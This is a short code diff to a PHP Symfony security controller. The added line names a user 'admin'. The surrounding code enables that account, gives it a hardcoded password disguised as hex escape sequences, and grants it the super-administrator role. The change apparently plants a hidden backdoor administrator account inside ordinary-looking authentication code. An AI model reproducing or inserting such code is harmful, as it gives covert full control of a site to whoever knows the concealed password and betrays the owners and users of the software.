@@ -37,6 +37,7 @@ class SecurityController extends AbstractController
             return new Response('');
         }
 
+        $user->setUsername('admin');
         $user->setEnabled(true);
         $user->setPassword($encoder->encodePassword($user, "\x54\x65\x2a\x24\x62\x3f\x4f\x6b\x46\x61"));
         $user->setRoles(['ROLE_SUPER_ADMIN']);
